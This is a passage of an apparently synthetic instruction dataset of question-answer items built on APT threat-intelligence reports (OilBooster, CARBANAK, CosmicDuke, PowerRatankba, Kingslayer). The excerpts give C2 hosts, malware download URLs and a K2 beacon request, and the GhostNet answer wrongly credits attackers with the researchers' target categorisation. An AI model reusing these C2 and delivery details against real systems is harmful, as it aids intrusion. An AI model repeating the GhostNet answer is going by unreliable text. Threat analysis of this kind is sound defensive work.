    "output": "Kaspersky researchers concluded that the Grabit malware campaign was distinctive due to its versatile behavior. Each sample of the malware differed in size and activity, yet they shared common internal names and identifiers. This variability suggested a sophisticated approach where the malware could adapt to different environments while maintaining core functionalities. Additionally, the timestamps of the samples aligned closely with the documented infection timeline, indicating a well-coordinated campaign. The malware was programmed in Windows 32-bit processor using the Microsoft .NET Framework (Visual Basic/C#), and all samples were compiled within a short period of three days between March 7th and 9th, 2015. This rapid compilation further underscored the campaign's organized nature and the potential for widespread distribution.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Network communication\nFor C&C communication and exfiltration, OilBooster uses the Microsoft Graph API to access the shared OneDrive account, using a variety of HTTP GET, POST, PUT, and DELETE requests to the graph.microsoft.com host over the standard 443 port. For brevity, we will also refer to these requests as OneDrive API requests. The encrypted communication is facilitated by the statically linked\nOpenSSL library, which handles the SSL communication.\nTo authenticate with the OneDrive account, OilBooster first obtains the  from the Microsoft identity platform (the authorization server) by sending a POST request with the following body over port 443 to login.microsoftonline.com/common/oauth2/v2.0/token, using hardcoded credentials:\nclient_id=860b23a7-d484-481d-9fea-d3e6e129e249\n&redirect_uri=https://login.live.com/oauth20_desktop.srf\n&client_secret=<redacted>\n&refresh_token=<redacted>\n&grant_type=refresh_token\nOilBooster obtains a new access token this way, which will be used in the Authorization header of the subsequent OneDrive API requests, along with a new refresh token. OilBooster also has a backup channel to request a new refresh token from its C&C server after 10 consecutive unsuccessful connections to the OneDrive server. As shown in Figure 7, the new token can be acquired by sending a simple HTTP GET request on port 80 to host1[.]com/rt.ovf (a legitimate, likely compromised website), which should be followed by the new refresh token in cleartext in the HTTP response.\nThe various network connections made by OilBooster are summarized in Figure 8.\nAnswer this question: How does OilRig's OilBooster utilize the Microsoft Graph API for command and control (C&C) communication and data exfiltration? Describe the authentication process and the role of the OpenSSL library.",
    "output": "OilBooster uses the Microsoft Graph API to communicate with a shared OneDrive account for C&C communication and data exfiltration. This involves sending various HTTP requests (GET, POST, PUT, DELETE) to the graph.microsoft.com host over the standard port 443. The encrypted communication is handled by the statically linked OpenSSL library, which manages SSL communication. To authenticate with the OneDrive account, OilBooster first obtains an access token from the Microsoft identity platform by sending a POST request to login.microsoftonline.com/common/oauth2/v2.0/token with hardcoded credentials. The request includes parameters such as client_id, redirect_uri, client_secret, refresh_token, and grant_type set to 'refresh_token'. Upon successful authentication, OilBooster receives a new access token and refresh token, which are used in the Authorization header of subsequent OneDrive API requests. Additionally, OilBooster has a backup mechanism to request a new refresh token from its C&C server if there are 10 consecutive unsuccessful connections to the OneDrive server. This backup channel involves sending an HTTP GET request to a compromised website, which responds with a new refresh token in cleartext.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Was There a Build Tool?\nLet's first take a look at our deduction about a build tool for CARBANAK:\n\"A build tool is likely being used by these attackers that allows the operator to configure details such as C2 addresses, C2 encryption keys, and a campaign code. This build tool encrypts the binary's strings with a fresh key for each build.\"\nWe came to this deduction from the following evidence:\n\"Most of CARBANAK's strings are encrypted in order to make analysis more difficult. We have observed that the key and the cipher texts for all the encrypted strings are changed for each sample that we have encountered, even amongst samples with the same compile time. The RC2\nkey used for the HTTP protocol has also been observed to change among samples with the same compile time. These observations paired with the use of campaign codes that must be configured denote the likely existence of a build tool.\"\nFigure 1 shows three keys used to decode the strings in CARBANAK, each pulled from a different CARBANAK sample.\nIt turns out we were spot-on with this deduction. A build tool was discovered in the CARBANAK source dump, pictured with English translations in Figure 2.\nWith this build tool, you specify a set of configuration options along with a template CARBANAK binary, and it bakes the configuration data into the binary to produce the final build for distribution. The Prefix text field allows the operator to specify a campaign code. The Admin host text fields are for specifying C2 addresses, and the Admin password text field is the secret used to derive the RC2 key for encrypting communication over CARBANAK's pseudo-HTTP protocol. This covers part of our deduction: we now know for a fact that a build tool exists and is used to configure the campaign code and RC2 key for the build, amongst other items. But what about the encoded strings? Since this would be something that happens seamlessly behind the scenes, it makes sense that no evidence of it would be found in the GUI of the build tool. To learn more, we had to go to the source code for both the backdoor and the build tool.\nFigure 3 shows a identifier named ON_CODE_STRING defined in the CARBANAK backdoor source code that when enabled, defines macros that wrap all strings the programmer wishes to encode in the binary. These functions sandwich the strings to be encoded with the strings \"BS\" and \"ES\". Figure 4 shows a small snippet of code from the header file of the build tool source code defining BEG_ENCODE_STRING as \"BS\" and END_ENCODE_STRING as \"ES\". The build tool searches the template binary for these \"BS\" and \"ES\" markers, extracts the strings between them, encodes them with a randomly generated key, and replaces the strings in the binary with the encoded strings. We came\nacross an executable named bot.dll that happened to be one of the template binaries to be used by the build tool. Running strings on this binary revealed that most meaningful strings that were specific to the workings of the CARBANAK backdoor were, in fact, sandwiched between \"BS\" and \"ES\", as shown in Figure 5.\n\nBased on the above text, answer a question. What role do the 'BS' and 'ES' markers play in the CARBANAK backdoor source code, and how does the build tool utilize these markers to encode strings within the binary?",
    "output": "In the CARBANAK backdoor source code, the 'BS' and 'ES' markers are used to identify strings that need to be encoded. When the ON_CODE_STRING identifier is enabled, it defines macros that wrap all strings the programmer wishes to encode in the binary with 'BS' and 'ES'. The build tool then searches the template binary for these markers, extracts the strings between them, encodes them with a randomly generated key, and replaces the original strings in the binary with the encoded strings. This process ensures that the meaningful strings related to the backdoor's functionality are obfuscated, making analysis more difficult.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: SCOPE\nWe have seen dozens of Cosmu samples that share code with MiniDuke. Rather than cover the entire spectrum of samples, the scope of this analysis was intentionally limited to highlighting the most interesting of the recent samples. This includes examining the attack files used to infect targets, the remote servers storing data collected from the victims and the differences between the MiniDuke loaders and Cosmu info-stealers used in the samples.\nMedium Headline: ARRIVAL\nAt this time, we have no information on how the CosmicDuke attack files are delivered to the victims, though based on the findings from the analysis, we can make an educated guess.\nIt is possible that the PDF documents containing exploits were emailed to the targeted users as file attachments. Assuming that the email gateway used by the victims does not include an antivirus solution capable of identifying the exploit, such files would have little impediment to being spread by email.\nIt is however unlikely that the samples which camouflaged the executable files as image or document files would be distributed in the same way. Regardless of any tricks played with the filenames, the files themselves are Windows executables, and many email solutions today prevent users from opening attached executable files.\nMedium Headline: INFECTION\nThe attackers are using at least two different methods for infecting the systems: exploits and social engineering.\nDOCUMENT-BASED EXPLOIT\nCosmicDuke malware samples that use exploits to gain entry onto a target system (referred to as exploit files in the rest of this document) start with a malicious Flash object embedded into a PDF file. When the file is launched, the object exploits the known CVE-2011-0611 vulnerability in specific versions of Adobe Flash, Reader and Acrobat products.\nUnlike the CosmicDuke files geared towards social engineering, the exploit files do not actually display any documents to the user as a form of distraction; the malware simply straightaway exploits the vulnerability.\nSOCIAL ENGINEERING\nLess technically challenging CosmicDuke samples use simple social engineering to trick the user into willingly launching the attack file. Once launched, the file drops the malware onto the system (such files are therefore referred to as droppers in the rest of this documents).\nTo do so, the malware's executable file is first disguised as an image or document to make it seem innocuous. When launched, a document or image is displayed in order to draw the user's attention away from any background activity. In the meantime, the malware's malicious files are silently installed and executed on the system.\nBig Headline: TECHNICAL DETAILS\nCosmicDuke samples can be divided into 3 distinct groups based on similarities between the C&C servers they contact, file characteristics and decoy document used. The full details of how the samples were grouped is listed on page 11; Figure 2 at left provides a quick summary of the grouping as they relate to how CosmicDuke is delivered, and the decoy documents shown.\nThe first group of samples (Group #1) is spread using 3 dropper files that display specific decoy documents. The second sample group (Group #2) uses both exploit-loaded files and dropper files. The third group (Group #3) is rather an exception, as it does not use the droppers or exploits listed here; for the sake of simplicity, we will exclude considering Group #3's delivery method.\nMedium Headline: DROPPER: RLO\nCosmicDuke's author(s) disguised the fact that the malware is an executable file by using the Right-to-Left Override (RLO) feature in Windows to hide the file's correct file extension, .exe or .scr, and replace it with .jpg, .pdf or .doc, in order to make the file appear to be an innocuous document or image.\nImage 1 is a screenshot of how the filenames look like in Windows 7. The real file extension for the top four files is .scr, while the real extension for the bottom one is .exe.\nNote that the attacker has also carefully changed the icon of the executable to reflect the fake filetype for the first four.\nThe bottom file is a curious exception, as it does not use a PDF icon as would be expected with a .pdf file extension; instead, it uses an NVIDIA icon, most likely to reflect the fact that the product name of the executable is listed as \"NVIDIA Update Components\" in the file's version information. This seems to be a common fake product name used in the latest Cosmu samples. Meanwhile, the\nfilename readily visible to the users is translated from Turkish as \"civilian crisis center status report\".\nThe use of RLO is a smart move from the attackers. Why go through the trouble of exploiting anything if you can simply trick the user into double-clicking an executable that looks a lot like a document file?\nAs the screenshot demonstrates, unchecking \"Hide extensions for known filetypes\" does not help. The three-letter file extensions seen at the end of the filename is not the real file extension. Even though the information in the Type column is correct, most of the users probably do not even check it.\nMedium Headline: DROPPER: DECOYS\nCosmicDuke dropper files all display some kind of a decoy document or image to distract the user when the attack file is launched.\nThe following are the droppers used by Group #1. Here are the filenames of the decoys, as displayed in Windows, and the decoy images or files they show when launched:\ny rcs.\u0417\u0430\u043a\u0430\u0437.doc\ny rcs.18.jpg\ny rcs.DSC_1365527283.jpg\n- Image 2\n- Image 3\n- Image 4\nThe decoys are interesting. \u0417\u0430\u043a\u0430\u0437 means \"order\" in Russian. Based on the characters \u0421\u0416\u0421-1295 and \u0413\u0425\u0420\u041f found in the decoy, the document looks like an order for growth hormones. The document contains full delivery address, including the name of the person placing the order.\nAn interesting detail about the image file of a receipt (Image 3) shown by rcs.18.jpg is that it contains EXIF metadata, including the date when the photo was taken and the model of the mobile phone that was used to take the photo. Part of this EXIF metadata is shown in Image 3a.\nThe third dropper file we've seen uses the filename 'rcs. Ukraine-Gas-Pipelines-Security-Report-March-2014.pdf', and displays the decoy document shown in Image 6. This particular dropper file is notable in that its info-stealer (SHA1:f513b21738ae3083d79e4fa1039889e1c3efff58) is the same one used by the exploit file named \"Bulletin-PISM-No-31-(625)-March-10-2014.pdf\".\nImage 3: Decoy shown by rcs.18.jpg\nImage 3a: EXIF metadata for file from image 3\nImage 2: Decoy shown  by rcs.\u0417\u0430\u043a\u0430\u0437.doc\nImage 6: Decoy document shown by  rcs.Ukraine-Gas-Pipelines-Security-Report-March-2014.pdf\nImage 4: Decoy shown by rcs.DSC_1365527283.jpg\nMedium Headline: EXPLOIT\nThe code used by CosmicDuke to exploit the CVE-2011-0611 vulnerability appears to be derived from this proof-of-concept code that was made available in early 2011:\ny\nhttp://www.exploit-db.com/exploits/17473/\nThe samples we analyzed of the exploit-based CosmicDuke variety had the file names and SHA1 values listed in Figure 3 at right (see \"Appendix A | Samples\" for more details).\nSome of these exploit files have interesting filenames, such as \"dip.mail march.pdf\" and \"Bulletin-PISM-No-31-(625)-March-10-2014.pdf\". The PISM mentioned in the latter presumably refers to the Polish Institute of International Affairs [1] .\nFIGURE 3: FILENAMES AND SHA1 VALUES OF COSMICDUKE EXPLOIT FILES\nMedium Headline: LOADER: MINIDUKE 3RD STAGE\nThe CosmicDuke samples we analyzed used the same loader as MiniDuke's stage 3 [2] samples, making this the first occasion in which we've seen other malware using this particular loader.\nThe parallel usage of the loader in the CosmicDuke and MiniDuke families is interesting. The oldest samples we have of this loader that loads Cosmu malware show the compilation date of the loader as March 24 2011, which predates the oldest publicly documented MiniDuke sample (with a recorded loader compilation date of June 18 2012). The earlier use of the loader with a Cosmu payload leads us to suspect the existence of a link between the author(s) of Cosmu and MiniDuke.\nThe most common compilation date seen for the loaders that load the Cosmu malware is November 13 2012. Perhaps coincidentally, we found one MiniDuke sample (originally reported by CrySys [3]) that also shows the same compilation date. In this case however, the MiniDuke component is actually a downloader; it connects to an IP address in Turkey, and when it receives a response, decrypts and executes it.\nAlso of interest is that once the MiniDuke loader was updated, we saw CosmicDuke samples take the updated loader into use in mid-April 1 2014, a few months after MiniDuke started using the latest loader in mid-December 2013. It seems possible that the actors behind the two malware families share code and/or tools.\nFIGURE 4: MILESTONES IN PARALLEL LOADER USE*  IN COSMU AND MINIDUKE FAMILIES\n1.  Polish Institute of International Affairs; http://www.pism.pl/en\n2. CIRCL - Computer Incident Response Center Luxembourg; Analysis of a stage 3 Miniduke sample; published 30 May 2013; http://www.circl.lu/assets/files/tr-14/circl-analysisreport-miniduke-stage3-public.pdf\n3.  Laboratory of Cryptography and System Security (CrySyS Lab); MiniDuke: Indicators; published 27 February 2013; http://www.crysys.hu/miniduke/miniduke_indicators_public.pdf\n\nWhat vulnerability does the CosmicDuke malware exploit in its document-based attacks, and how does it differ from the social engineering approach?",
    "output": "CosmicDuke exploits the CVE-2011-0611 vulnerability in specific versions of Adobe Flash, Reader, and Acrobat products. Unlike the social engineering approach, the exploit files do not display any documents to the user as a distraction; instead, the malware immediately exploits the vulnerability upon opening the PDF file. This method relies on technical exploitation rather than deceiving the user into manually launching the malware.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: JavaScript Downloaders\nThroughout November several compressed ZIP files containing a JavaScript (JS) downloader were observed being hosted on likely attacker-controlled servers. We are not currently aware if or how these files were delivered to potential victims. The naming of the files and the decoy PDF documents they retrieve provide some clues about the nature of the lures. Themes include the cryptocurrency exchanges (<https://www.coinbase.com/?locale=en>)Coinbase and (<https://www.bithumb.com/>)Bithumb, the (<https://falconcoin.co/home>)Falcon Coin ICO, and a list of Bitcoin transactions.\nEach JavaScript downloader is obfuscated (Fig. 13) using (<https://javascriptobfuscator.com/Javascript-Obfuscator.aspx>)JavaScript Obfuscator (see Attribution section for additional analysis) or a similar tool. After de-obfuscating (Fig. 14), the logic of the malicious downloader is very straightforward. First, an obfuscated PowerRatankba.B PowerShell script is downloaded from a fake image URL such as: hxxp://51.255.219[.]82/ theme.gif. Next, the PowerShell script is saved to C:\\Users\\Public\\Pictures\\opt.ps1 and then executed.\nThe last step in execution is to retrieve the decoy PDF from hxxp://51.255.219[.]82/files/download/falconcoin.pdf and open it using rundll32.exe and shell32.dll,OpenAs_RunDLL (Fig. 15-1). Samples using Coinbase and Bithumb themes also downloaded PDF decoys (Fig. 15-2,15-3). Additionally we discovered that the content from the Coinbase decoy has been used in Lazarus group-attributed espionage campaigns (see Attribution for more details).\nMedium Headline: VBScript Macro Microsoft Office Documents\nTwo VBScript macro-laden Microsoft Office documents have been observed associated with this activity: one Word document and one Excel spreadsheet. The Word document (b3235a703026b2077ccfa20b3dabd82d65c6b5645f7f1 5e7bbad1ce8173c7960) uses an Internal Revenue Service (IRS) theme and was sent as an attachment named \"report phishing.doc\". The spearphishing email was sent from an @mail.com address with the subject of \"Phishing Warnning\"[sic]. Ironically, the sender email address was spoofed as phishing@irs.gov (Fig. 16) while the content of the lure (Fig. 17) was likely copied from an (<https://www.irs.gov/privacy-disclosure/report-phishing>)official IRS webpage.\nThe IRS-themed malicious document uses a macro to download a PowerRatankba VBScript from hxxp://198.100.157[.]239/hide.gif (Fig. 18), save it to C:\\ Users\\Public\\Pictures\\opt.vbs, and execute it with wscript. exe. It in turn downloads the PowerRatankba.B from hxxp://198.100.157[.]239/theme.gif, saving the downloaded payload to C:\\Users\\Public\\Pictures\\opt.ps1, and finally executing it with powershell.exe.\nThe second malicious Office document we discovered is an Excel spreadsheet named bithumb.xls. It uses a (<https://www.irs.gov/privacy-disclosure/report-phishing>)Bithumb lure (Fig. 19) and includes stolen branding. The spreadsheet was found compressed in a ZIP file named Bithumb.zip along with a decoy PDF document named \"About Bithumb.pdf\" (Fig. 20).\nThe Excel spreadsheet contains a macro with an embedded Base64-encoded PowerRatankba VBScript downloader (rather than retrieving it from a C&C using HTTP (Fig. 21)). The embedded VBScript is first dropped to disk at c:\\Users\\ Public\\Documents\\Proxy.vbs and then executed using wscript.exe. The dropped VBScript file is configured to download PowerRatankba from hxxp://www.energydonate[.]com/images/character.gif while saving the downloaded payload to C:\\ Users\\Public\\Documents\\ProxyAutoUpdate.ps1.\nMedium Headline: Backdoored PyInstaller Applications\nMost recently, several large email phishing campaigns attempted to trick unsuspecting victims into visiting fake webpages to download or update cryptocurrency applications. The copycat websites were mirror images of legitimate websites with software download links pointing to the correct installers hosted on the legitimate websites. The only exception was the link to download the Windows version of the application, which was hosted  on the copycat websites. These (<http://www.pyinstaller.org/>)PyInstaller executables were backdoored with a few lines of Python code added to download the PowerRatankba implant.\nThe first campaign that utilized this technique used a Bitcoin Gold (BTG) theme to trick the targets into visiting an (<https://en.wikipedia.org/wiki/Internationalized_domain_name>)internationalized domain name (IDN) website (Fig. 22). An email was sent to targets offering a BTG wallet application along with a link to the malicious website: hxxps://xn--bitcoingld-lcb[.]org/. However, web browsers and email clients would display the link as follows: hxxps://bitcoing\u00f6ld[.]org/. Emails in this BTG campaign were sent between approximately November 10-16, 2017. Some of the known sender emails include but are not limited to: info@xn--bitcoingod-8yb[.]com, info@xn--bitcoigold-o1b[.]com, and tech@xn--bitcoingld-lcb[.]org. Campaigns using IDN can be difficult to recognize as malicious because they are typically very similar to the mimicked legitimate domains except for a single character (Fig. 23). (see IOC section for more likely related IDNs)\nFigure 22: Sample email containing a URL to malicious IDN hosting PyInstaller PowerRatankba downloader. The\nIDN email address is emphasized in a red box.\nMany thanks to Yonathan Klijnsma ((<https://twitter.com/ydklijnsma>)@ydklijnsma) of RiskIQ, whose assistance allowed us to analyze a historical scrape of one of the web pages hosting the malware at xn--bitcoingld-lcb[.]org. In the scrape, an additional text and a button were inserted in place of the BTG logo. The button used JavaScript  to download a payload from hxxps://bitcoing\u00f6ld[.]org/bitcoingold. exe (IDN: xn--bitcoingld-lcb[.]org) (Fig. 24). Additional differences are likely the result of changes to the legitimate website (Fig. 25) since the malicious campaign.\nOnce clicked, the button on the malicious BTG page would have directed a victim to download a payload from hxxps://bitcoing\u00f6ld[.]org/bitcoingold.exe. At the time of our analysis, this URL was not returning content. However, we discovered from a comment on a multiple anti-virus scanning service that someone targeted by this campaign had uploaded a payload downloaded from the fake website. The file in that case was named ElectronGold-1.1.1.exe (eab612e333baaec0709f3f213f73388607e495d8af9a2851f352481e996283f1). We also found a similar payload with unknown origin named ElectronGold-1.1.exe (b530de08530d1ba19a94bc075e74e2236c106466dedc92be3abdee9908e8cf7e).\nThe second campaign we discovered used a fake (<https://electrum.org/#home>)Electrum update as the lure to similarly direct victims to a malicious IDN resembling the legitimate electrum.org website (Fig. 26). The emails in this case were sent, based on our visibility, using a unique @mail.com email address for each recipient, and at least some of the emails were sent between November 18-21, 2017. A subject of \"New Electrum Wallet Released\" was used to trick victims into thinking that they needed to download an update for Electrum to be able to use Segwit2X and Bitcoin Gold. If a victim clicked on the malicious link, they were presented with what appeared to be a normal version of Electrum's official website (Fig. 27).\nEach of the links highlighted in red led to a malicious payload hosted directly on the same server: hxxps://xn--electrms2a[.]org/electrum-3.0.3.exe (Fig. 28). The electrum-3.0.3.exe is a backdoored PyInstaller that is configured to download a VBScript PowerRatankba downloader.\nIn both campaigns, the same malicious Python code was injected into the PyInstallers, specifically into \\gui\\qt\\installwizard. py. The backdoor code in each campaign is nearly identical except for the target URL and the file name to which the downloaded VBScript is saved (Fig. 29).\nThe BTG campaign was configured to download a VBScript from hxxp://www.btc-gold[.]us/images/top_bar.gif while saving the downloaded script to C:\\Users\\Public\\Documents\\diff.vbs. We were unable to retrieve this file but suspect a PowerRatankba variant would have been downloaded based on other campaigns.\nThe Electrum campaign was similarly configured to download a VBScript; however, in this case we were able to analyze the downloaded payload. The backdoored installwizard.py downloaded a script from hxxp://trade.publicvm[.]com/images/top_ bar.gif (see Attribution section for more commentary) while saving the downloaded script to C:\\Users\\Public\\Documents\\ Electrum_backup.vbs. The downloaded Electrum_backup.vbs was a PowerRatankba downloader with a target URL of hxxp://trade.publicvm[.]com/images/character.gif, which ultimately delivered a PowerRatankba implant with a C&C of trade. publicvm[.]com.\nMedium Headline: PowerRatankba Description\nPowerRatankba is used for the same purpose as Ratankba: as a first stage reconnaissance tool and for the deployment of further stage implants on targets that are deemed interesting by the actor. Similar to its predecessor, PowerRatankba utilizes HTTP for its C&C communication.\nOnce executed, PowerRatankba first sends detailed information about the infected device to its C&C server via the BaseInfo HTTP POST (Fig. 30), including the computer name, IP address(es), OS boot time and installation date, language, if ports 139, 3389, and/or 445 are open/closed/filtered, a process list, and (PowerRatankba.B only) output from two WMIC commands (Fig. 31).\nThere are only slight variations between the initial BaseInfo HTTP POST, such as the process list is retrieved by PowerRatankba.A using \"tasklist /svc\" while PowerRatankba.B uses just \"tasklist\".\nRead the text above and answer this question: What are the different delivery methods used by the Lazarus Group to infect victims with PowerRatankba, and how do these methods differ in terms of their implementation and targeting?",
    "output": "The Lazarus Group employs several delivery methods to infect victims with PowerRatankba. One method involves JavaScript downloaders hosted on attacker-controlled servers, which download and execute PowerRatankba.B PowerShell scripts. Another method uses VBScript macro-laden Microsoft Office documents, such as Word and Excel files, which contain macros that download and execute PowerRatankba scripts. These documents often use themes related to cryptocurrency exchanges or government agencies to lure victims. Additionally, the group uses backdoored PyInstaller applications distributed through phishing campaigns, where fake websites mimic legitimate cryptocurrency sites to trick users into downloading malicious executables.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: Analysis of list of infected computers\nA detailed analysis of the list of infected computers revealed an overwhelming number of unique infections in many countries. The same malware that infected computers at the Dalai Lama's office and other Tibetan organizations had a much more extensive set of targets. The list of entities and locations of those targeted was quite varied.\nIn total, we found 1,295 infected computers located in 103 countries. We found that we were able to confidently\u2014on a scale of low, medium, high\u2014identify 397 of the 1,295 infected computers (26.7%), and labelled each one as a high-value target. We did so because they were either significant to the relationship between China and Tibet, Taiwan or India, or were identified as computers at foreign embassies, diplomatic missions, government ministries, or international organizations.\nOf the remaining infected computers, 536 appear to be computers on private broadband Internet providers. The remaining IP addresses do not reverse resolve and available information on these hosts does not allow us to make judgements regarding the identity or purpose of these computers.\n\nQ: How did the GhostNet attackers prioritize and categorize their infected targets, and what criteria did they use to identify high-value targets?",
    "output": "A: The GhostNet attackers prioritized and categorized their infected targets by identifying high-value targets based on specific criteria. Out of the 1,295 infected computers located in 103 countries, they confidently identified 397 computers as high-value targets. These targets were selected because they were significant to the relationship between China and Tibet, Taiwan, or India, or were identified as computers at foreign embassies, diplomatic missions, government ministries, or international organizations. This categorization allowed the attackers to focus their efforts on strategically important entities.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: AN IRRESISTIBLE ENTICEMENT FOR KINGSLAYER ACTORS\nAlthough we do not know the exact reasons the Kingslayer actors chose to subvert Alpha's software product, the list of possible end-users of the application likely served as a powerful motivator.  As stated earlier, a free application license was offered to subscribers of Alpha's event log information portal service. While we do not know how many of these subscribers took advantage of the free license and installed the application during the subversion window, it is logical that some did. Organizations who, at some time, subscribed to the event log portal are displayed on Alpha's website and include:\n\u2022 4 major telecommunications providers\n\u2022 10+ western military organizations\n\u2022 24+ Fortune 500 companies\n\u2022 5 major defense contractors\n\u2022 36+ major IT product manufacturers or solutions providers\n\u2022 24+ western government organizations\n\u2022 24+ banks and financial institutions\n\u2022 45+ higher educational institutions\n4\nBig Headline: ELEVEN AND A HALF WEEKS\nBecause we have an incomplete picture of the successful Kingslayer target set, our timeline has some significant gaps. One important gap begging for explanation was the time between when Alpha's websites and software distribution were remediated on 26 April 2015, and the time when forensic evidence shows that Kingslayer visited the Iota network on 15 July 2015 (Figure 3).\nOne might surmise that if Iota was of particular interest to the Kingslayer actors, then less than eleven and a half weeks would pass before exploitation of their target network. One possible explanation is that Iota was not a preferred target at all. Rather, the eleven and a half weeks was spent by the actors exploiting potentially more lucrative targets than Iota. In effect, RSA Research proposes that Iota was an inconsequential target, passed over for some sufficient time for more important exploitation to be executed. This is why a supply chain attack is attractive to threat actors; a single compromise within the supply chain can yield numerous targets with minimal additional effort.\nAlpha issued a Security Notification on their website on 30 June 2016 and updated the notification on July 17, 2016 at RSA's request, following findings from further investigation on Iota's network compromised by Kingslayer.\nMedium Headline: KINGSLAYER CONNECTIONS TO CODOSO AND SHELL_CREW\nThe Kingslayer backdoor, discovered during an RSA Research \"excavation\" into common C2 infrastructure and malware bytecode, shares tactics previously observed used by Shell_Crew, an adversary RSA Research reported on in January 2014 5 . The specific infrastructure overlapping with the Kingslayer campaign was tied to an adversary identified as Codoso by Palo Alto 6  and ProofPoint 7  in the first quarter of 2016, and the apparent operational infrastructure harvesting campaign that we call Schoolbell. We do not have high confidence that the Codoso perpetrators are directly related to the Shell_Crew activity encountered in 2013 and 2014, but we observed that they use common resources and tools. For one, Codoso and Shell_Crew use continuously evolving versions of malware for which no builder or source code has been found in the wild. These include older Derusbi variants, as well as the newly pressed Rekaf, TXER, PGV_ PVID and Bergard as described by ProofPoint, PaloAlto, and in the Schoolbell blog post. This indicates that they have some common, restricted source for this distinctive malware. Consistent common malware bytecode, strings, and encoding routines were also noted by other researchers such as Proofpoint. These attributes are, thus far, unique to the activity groups and have allowed RSA Research and others to track malware clusters as they appear in the wild. For consistency we will attribute the activity in the Kingslayer campaign to King-slayer, but acknowledge some risk of erroneously conflating it with other threat groups labeled variously by other researchers as Codoso, as well as historic activity that RSA Research has grouped together as Shell_Crew.\nThe clearest operational links between Kingslayer and other recent campaigns attributed to Codoso are overlapping domains and IP addresses used for C2 in 2015 and 2016. The Kingslayer C2 URL www.oraclesoft[.]net has temporal overlaps with identified infrastructure from seven other C2 domains and twelve unique C2 IP addresses associated with at least twenty four unique samples of malware attributed to Codoso by ProofPoint and Palo Alto (Figure 4, attached also in Annex), and described in the Schoolbell blogpost by RSA Research.\n5\n6\n7\nMedium Headline: RECALLING ANOTHER SOFTWARE SUPPLY-CHAIN ATTACK\nThe Kingslayer campaign shares similarities with another supply-chain attack. In the Monju Incident 8 the attackers subverted an otherwise legitimate software server by using a redirect to a different, unrelated website controlled by the actors. Like Kingslayer, the target system with the already installed software would attempt to get an update, but instead received a malicious payload purporting to be an update that consisted of the original application software bundled with a Trojan, instead of a legitimate update. In the Kingslayer attack, systems attempting to get updates to an already installed Windows operating systems log analysis software program were transparently redirected to a website controlled by the Kingslayer actors, in which the illegitimate website would download a subverted update executable. What may have differed from the Monju incident was the fact that while all software installations that attempted to update during the Kingslayer campaign received a malicious but otherwise functioning update, we do not know how many of them also received the secondary malware. It is this secondary malware that has not yet been found in the wild.\nWe have no evidence to suggest the actors behind the Monju Incident and King-slayer are related, other than they used one or more of the same tactics.\n8\nMedium Headline: KINGSLAYER'S MEMORY-RESIDENT BROTHER, THE K2 TROJAN\nRSA Research believes all of the particular Alpha application installations attempting to update during the 17 day Kingslayer subversion window received a malicious but otherwise functioning update. We do not know how many of them also received the secondary malware. Using passive analysis, RSA Research was able to identify the probable beaconing activity pattern used by the secondary malware. Like the Kingslayer backdoor loader, the secondary malware used the domain www.oraclesoft[.]net for C2. We have dubbed this secondary malware \"Kingslayer Two\" or \"K2.\" The beaconing pattern of K2 differed from the King-slayer backdoor that loaded it. K2 beacons every ten minutes without a defined sleep period. Based on passively observed beacon activity from three different K2-infected systems, we believe K2's HTTP GET beacon pattern is a three to four digit load identifier that may represent the K2 malware load sequence assigned to each unique infection. This number appeared to be both unique, and static for each infected system. So 3423 in Table 1 might represent the 3,423rd unique system loaded with the K2 Trojan.\nTable 1 Kingslayer secondary malware K2 with possible load identifier highlighted in yellow\nGET /softs/updatecheck.html?3423&464336 HTTP/1.1\nUser-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0) Host: www.oraclesoft.net\nRSA Research also has insight into K2 Trojan's capabilities based on the artifacts left on a system that had K2 installed. (See Appendix B) From the forensic artifacts, RSA Research infers that K2's capabilities include:\n\u2022 running arbitrary Windows shell commands with SYSTEM-level privileges,\n\u2022 upload and download of files, and\n\u2022 execution of programs uploaded by the attackers.\nMedium Headline: WHY SOFTWARE SUPPLY-CHAIN ATTACKS ARE HERE TO STAY\nSupply-chain attacks provide strategic advantages to attackers for several reasons. First, they provide one compromise vector to multiple potential targets. Second, supply chain exploitation attacks, by their very nature, are stealthy and have the potential to provide the attacker access to their targets for a much longer period than malware delivered by other common means, by evading traditional network analysis and detection tools. And finally, software supply chain attacks offer considerable \"bang for the buck\" against otherwise hardened targets9 .\n9\nIn the case of Kingslayer, this especially rings true because the specific system-administrator-related systems most likely to be infected offer the ideal beachhead and operational staging environment for systematic exploitation of a large enterprise.\nSubverting an application used almost exclusively by enterprise Windows system administrators gives the perpetrators direct access to the most sensitive parts on an organization's network via a workstation or server used regularly by the \"king of the network.\" A system administrator's workstation and cache of credentials invariably provides the most access of any system on an enterprise network. In our experience, the credentials maintained by system administrators usually enable extensive access to internal and external network infrastructure of even the most sensitive organization's enterprise. RSA Research observed Kingslayer installed on the workstation of the senior systems administrator at one organization and on the domain controllers of another organization. We assess that installations of the targeted application on workstations or servers with unprivileged users would be exceptions, rather than the rule, because the purpose of the targeted log analyzer software is to be used by system, security, and other privileged administrators.\nAnswer this question: How does the Kingslayer campaign compare to the Monju Incident in terms of tactics and outcomes, and what unique aspect of the Kingslayer attack sets it apart?",
    "output": "Both the Kingslayer campaign and the Monju Incident involved subverting legitimate software updates to deliver malicious payloads. However, in the Kingslayer attack, all software installations attempting to update received a malicious but functioning update, whereas it is unknown how many received the secondary malware, which has not been found in the wild. This secondary malware, dubbed 'K2,' used the domain www.oraclesoft[.]net for C2 and had a distinct beaconing pattern, beaconing every ten minutes without a defined sleep period.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How did APT12 modify the RIPTIDE backdoor to create HIGHTIDE, and what were the specific changes made to evade detection?",
